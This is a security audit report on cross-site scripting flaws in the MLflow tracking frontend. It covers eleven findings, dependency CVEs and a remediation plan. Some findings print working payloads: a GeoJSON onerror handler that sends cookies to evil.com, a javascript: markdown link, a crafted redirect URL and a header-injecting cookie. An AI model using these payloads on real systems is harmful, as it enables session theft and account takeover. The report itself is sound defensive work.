# MLflow Frontend XSS Security Audit Report

**Date:** 2026-03-24
**Scope:** MLflow experiment tracking frontend (`mlflow/server/js/src/experiment-tracking/`)
**Focus:** Cross-Site Scripting (XSS) vulnerabilities — stored, reflected, and DOM-based

---

## Executive Summary

This audit examined ~50 frontend components across the MLflow experiment tracking UI, including run pages, experiment pages, artifact viewers, comparison views, metric charts, evaluation/trace views, and supporting utilities. The analysis identified **5 confirmed vulnerabilities** (2 high, 3 medium severity), **3 dependency-level risks**, and several defense-in-depth concerns. The most critical findings involve the markdown sanitization pipeline and the GeoJSON map viewer.

---

## Critical & High Severity Findings

### V-001: Stored XSS via GeoJSON `popupContent` in Leaflet Map Viewer (HIGH)

- **File:** `ShowArtifactMapView.tsx`
- **Sink:** `layer.bindPopup(popupContent)` — Leaflet renders popup content via `innerHTML`
- **Source:** `feature.properties.popupContent` from user-uploaded GeoJSON artifacts
- **Attack:** Upload a GeoJSON file with:
  ```json
  {
    "type": "Feature",
    "geometry": { "type": "Point", "coordinates": [0, 0] },
    "properties": {
      "popupContent": "<img src=x onerror='fetch(`https://evil.com/?c=`+document.cookie)'>"
    }
  }
  ```
  When any user views the artifact and clicks the map feature, the script executes in the MLflow application origin with full access to cookies, API, and DOM.
- **Exploitability:** HIGH — requires only artifact upload permission and a single click
- **Remediation:** Sanitize `popupContent` with DOMPurify before passing to `bindPopup()`, or use `layer.bindPopup(document.createTextNode(popupContent))` for text-only popups.

### V-002: Stored XSS via `javascript:` URI in Markdown Notes (HIGH)

- **Files:** `MarkdownUtils.ts` → consumed by `EditableNote.tsx`, `ExperimentViewDescriptionNotes.tsx`, `ExperimentViewNotes.tsx`, `RunViewDescriptionBox.tsx`
- **Sink:** `dangerouslySetInnerHTML={{ __html: sanitizedContent }}`
- **Source:** `mlflow.note.content` tag (experiment/run description notes)
- **Attack:** Set a note containing `[Click here](javascript:alert(document.cookie))`. Showdown converts this to `<a href="javascript:alert(document.cookie)">Click here</a>`. The `sanitize-html` configuration does **not** restrict URI schemes in `href` attributes, so the `javascript:` protocol passes through sanitization. When another user views the note and clicks the link, the script executes.
- **Exploitability:** HIGH — requires experiment write access; victim must click the link
- **Remediation:** Add `allowedSchemes: ['http', 'https', 'mailto', 'ftp']` to sanitizer options in `MarkdownUtils.ts`.

---

## Medium Severity Findings

### V-003: Content Injection via `iframe` in Sanitizer Allowlist (MEDIUM)

- **File:** `MarkdownUtils.ts` — `sanitizerOptions.allowedTags` includes `iframe`
- **Sink:** `dangerouslySetInnerHTML` in `EditableNote.tsx` and `ExperimentViewDescriptionNotes.tsx`
- **Source:** Markdown notes (experiment/run descriptions)
- **Impact:** While `sanitize-html` strips attributes for tags not in `allowedAttributes`, the inclusion of `iframe` in the allowlist creates unnecessary attack surface. Depending on `sanitize-html` version behavior, an `iframe` with a `src` attribute pointing to an attacker-controlled domain could enable phishing overlays within the MLflow UI.
- **Remediation:** Remove `iframe` from `allowedTags` unless there is a clear product requirement.

### V-004: Open Redirect via Crafted Git Source URL (MEDIUM)

- **File:** `Utils.tsx` → `getGitRepoUrl()` → rendered in `RunViewSourceBox.tsx`
- **Sink:** `<a target="_top" href={gitRepoUrlOrNull}>` via `Utils.renderSource()`
- **Source:** `mlflow.source.name` tag (set when a run is created)
- **Attack:** The git URL regex `/(.*?[@/][^?]*git.*?)[:/]([^#]+)(?:#(.*))?/` is very permissive. A crafted source name like `https://evil.com/fakegit:/payload` matches and produces a link to an attacker-controlled domain. The `target="_top"` attribute means clicking navigates the entire window.
- **Additional issue:** `branchName` (from `mlflow.source.git.branch` tag) is interpolated into the URL path without encoding, enabling path traversal.
- **Remediation:** Validate constructed URLs against an allowlist of known git hosting domains. URL-encode `branchName` and other tag-derived path segments.

### V-005: Cookie-to-HTTP-Header Injection (MEDIUM)

- **File:** `FetchUtils.ts` → `getDefaultHeadersFromCookies()`
- **Sink:** HTTP request headers on every outgoing fetch call
- **Source:** `document.cookie` — cookies prefixed with `mlflow-request-header-`
- **Attack:** If an attacker can set cookies on the MLflow domain (via subdomain XSS, cookie tossing, or CRLF injection), they can inject arbitrary HTTP headers into every API request. For example, `mlflow-request-header-Authorization=Bearer+EVIL_TOKEN` would override authentication headers.
- **Remediation:** Whitelist allowed header names. Validate/sanitize header values. Prevent overriding security-sensitive headers (`Authorization`, `Cookie`, `Host`).

---

## Low Severity & Defense-in-Depth Findings

### V-006: HTML Artifact Viewer — Sandboxed but Fragile (LOW)

- **File:** `ShowArtifactHtmlView.tsx`
- HTML artifacts are loaded in an iframe with `sandbox="allow-scripts"` but without `allow-same-origin`. This correctly prevents cookie/DOM access from the parent. However, the defense is fragile — adding `allow-same-origin` would make this a critical full XSS.
- **Recommendation:** Add code comments and lint rules to prevent `allow-same-origin` from being added.

### V-007: Tracking Pixel via `img[src]` in Markdown (LOW)

- **File:** `MarkdownUtils.ts` — `allowedAttributes` permits `img` with `src`
- An attacker can embed `<img src="https://attacker.com/pixel.gif">` in markdown notes. When viewed, the browser fetches the image, disclosing the viewer's IP address.
- **Recommendation:** Consider restricting `img[src]` to relative URLs or a known domain allowlist.

### V-008: `innerHTML` with Hardcoded Value in Map View (LOW)

- **File:** `ShowArtifactMapView.tsx`
- `document.getElementsByClassName('map-container')[0].innerHTML = inner` uses string concatenation with a hardcoded `mapDivId`. Not currently exploitable, but the pattern is risky.
- **Recommendation:** Replace with `document.createElement()`.

### V-009: Recursive URI Decoding of URL Parameters (LOW)

- **File:** `CompareRunPage.tsx`
- Recursive `decodeURIComponent()` defeats encoding-based defense layers. Combined with `JSON.parse` of attacker-controlled query parameters, this enables parameter injection into API calls.
- **Recommendation:** Decode only once; validate parsed values.

### V-010: Unvalidated `JSON.parse` of URL Query Parameters (LOW)

- **Files:** `MetricPage.tsx`, `Utils.tsx` (`getMetricPlotStateFromUrl`, `getPlotLayoutFromUrl`)
- URL query parameters are parsed via `JSON.parse` without schema validation. Parsed objects flow into Plotly layout configuration and React state.
- **Recommendation:** Validate parsed objects against expected schemas.

### V-011: CSV Export Without Formula Escaping (LOW)

- **File:** `MetricsPlotPanel.tsx` — `convertMetricsToCsv()`
- Metric keys/values are joined into CSV without escaping formula-triggering characters (`=`, `+`, `-`, `@`). Opening the export in Excel could trigger formula injection.
- **Recommendation:** Prefix values starting with formula characters with a single quote.

---

## Dependency Vulnerabilities

### D-001: `sanitize-html` ^1.18.5 — 5 Known CVEs (HIGH)

The `^1.18.5` semver range caps at <2.0.0, meaning **none** of the following fixes can be applied:

| CVE | Severity | Description | Fixed In |
|-----|----------|-------------|----------|
| CVE-2019-25225 | Medium | XSS via `transformTags` | 2.0.0 |
| CVE-2021-26539 | Medium | Access restriction bypass | 2.3.1 |
| CVE-2021-26540 | Medium | `allowedIframeHostnames` bypass | 2.3.2 |
| CVE-2022-25887 | Medium | ReDoS via HTML comment regex | 2.7.1 |
| CVE-2024-21501 | Medium | Info exposure via `style` attribute | 2.12.1 |

**Recommendation:** Upgrade to `sanitize-html` >=2.12.1 (current latest: 2.17.2).

### D-002: `showdown` ^1.8.6 — Unmaintained, No XSS Protection (MEDIUM)

Showdown explicitly does not sanitize output (by design). Combined with the vulnerable `sanitize-html` version, this creates a dangerous pipeline. Additionally, CVE-2024-1899 (DoS via uncontrolled recursion) affects all versions through the latest (2.1.0) with no fix available.

**Recommendation:** Replace Showdown with `marked` or `markdown-it`, or migrate entirely to `react-markdown` v10 (already present in the project as an alias).

### D-003: `dompurify` Not Present (INFORMATIONAL)

DOMPurify, the industry-standard client-side HTML sanitizer, is not a project dependency. Adding it as a defense-in-depth layer for all `dangerouslySetInnerHTML` usage would significantly reduce risk.

---

## Components Verified as Safe

The following patterns were confirmed safe due to React's automatic JSX escaping:

| Component | Data Rendered | Why Safe |
|-----------|--------------|----------|
| `RunViewHeader.tsx` | Run name, experiment name | React text interpolation `{value}` |
| `RunViewTagsBox.tsx` / `KeyValueTag.tsx` | Tag keys and values | `<Typography.Text>{value}</Typography.Text>` |
| `RunViewMetricsTable.tsx` | Metric keys and values | React text children in `<Link>` |
| `GenericInputModal.tsx` / `RenameRunModal.tsx` | User form input | React-managed form inputs |
| `CompareRunScatter.tsx` / `CompareRunContour.tsx` | Plotly tooltips | `lodash.escape()` applied to all user strings |
| `EvaluationTextCellRenderer.tsx` | Evaluation text | React fragments with `escapeRegExp()` |
| `ExperimentViewArtifactLocation.tsx` | Artifact location path | React text node |
| `ShowArtifactImageView.tsx` | SVG artifacts | `<img src>` blocks script execution |
| `ShowArtifactVideoView.tsx` / `AudioView.tsx` | Media artifacts | `<video>`/`<audio>` elements don't execute scripts |

---

## Prioritized Remediation Plan

| Priority | Finding | Action | Effort |
|----------|---------|--------|--------|
| **P0** | V-001 | Sanitize GeoJSON `popupContent` before `bindPopup()` | Low |
| **P0** | V-002 | Add `allowedSchemes` to `sanitize-html` config in `MarkdownUtils.ts` | Low |
| **P0** | D-001 | Upgrade `sanitize-html` to >=2.12.1 | Medium |
| **P1** | V-003 | Remove `iframe` from `allowedTags` | Low |
| **P1** | V-004 | Validate git source URLs against domain allowlist | Medium |
| **P1** | V-005 | Whitelist allowed header names in `getDefaultHeadersFromCookies` | Low |
| **P1** | D-002 | Replace `showdown` with `react-markdown` or `marked` | Medium |
| **P2** | V-006–V-011 | Address defense-in-depth issues | Low each |
| **P2** | D-003 | Add `dompurify` as defense-in-depth | Low |

---

## Methodology

- **Static analysis** of ~50 React/TypeScript components
- **Data flow tracing** from user-controlled sources (API tags, URL parameters, uploaded artifacts, cookies, localStorage) to DOM sinks (`dangerouslySetInnerHTML`, `innerHTML`, `href`, Leaflet `bindPopup`, Plotly config)
- **Dependency CVE review** via Snyk, NVD, and GitHub advisories
- **Negative testing** confirmation that React JSX auto-escaping protects the majority of rendering paths
